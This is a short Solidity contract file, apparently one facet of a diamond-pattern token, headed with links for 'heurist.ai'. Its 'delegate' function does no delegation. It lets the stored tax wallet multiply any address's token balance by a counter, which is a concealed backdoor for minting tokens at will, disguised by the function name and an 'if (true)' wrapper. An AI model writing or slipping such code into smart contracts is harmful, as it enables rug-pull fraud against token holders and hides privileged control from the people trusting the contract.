// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.heurist.ai/
    Twitter:  https://twitter.com/heurist_ai
    Discord:  https://discord.com/heuristai
    Medium:   https://heuristai.medium.com/

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
